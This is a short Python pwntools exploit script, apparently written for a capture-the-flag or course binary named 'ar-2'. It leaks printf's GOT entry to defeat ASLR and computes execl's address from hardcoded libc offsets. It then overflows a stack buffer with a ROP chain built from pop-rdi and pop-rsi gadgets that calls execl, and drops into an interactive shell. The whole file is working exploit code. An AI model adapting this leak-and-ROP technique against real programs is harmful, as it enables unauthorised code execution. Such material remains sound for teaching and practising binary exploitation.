#!/usr/bin/env python

from pwn import *
import os

p = process("./ar-2")

# This function will read N bytes from address A and print them
print(p.recvline())
# How many bytes do you want to read (N, in decimal)?
print(p.recvline())

got_of_printf = p.elf.got['printf']
print("Got of printf %s" % hex(got_of_printf))

p.sendline('8')
# What is the address that you want to read (A, in hexadexmial, e.g., 0xffffde01)?
print(p.recvline())

p.sendline(hex(got_of_printf))

# Reading 8 bytes from 0x601020
print(p.recvline())
# ___________ Please type your name
d = p.recvline()
print(d)
output=d.split('P')[0]
print(output)


# $1 = {<text variable, no debug info>} 0x7fbddaa2c800 <__printf>
# $2 = {<text variable, no debug info>} 0x7fbddaaa3a20 <__GI_execl>

printf_addr = 0x7fbddaa2c800
execl_addr = 0x7fbddaaa3a20
addr_execl = u64(output) - printf_addr + execl_addr

print '---test---'
print hex(addr_execl)


# 0x0000000000400a33 : pop rdi ; ret
# 0x0000000000400a31 : pop rsi ; pop r15 ; ret
pop_rdi_ret = p64(0x0000000000400a33)
pop_rsi_r15_ret = p64(0x0000000000400a31)

# 0x400050:       "@"
run=0x400020

buf = "A" * 0x80 + "A"*8
buf += pop_rdi_ret
buf += p64(run)
buf += pop_rsi_r15_ret
buf += p64(0)
buf += p64(0)
buf += p64(addr_execl)
p.sendline(buf)
p.interactive()

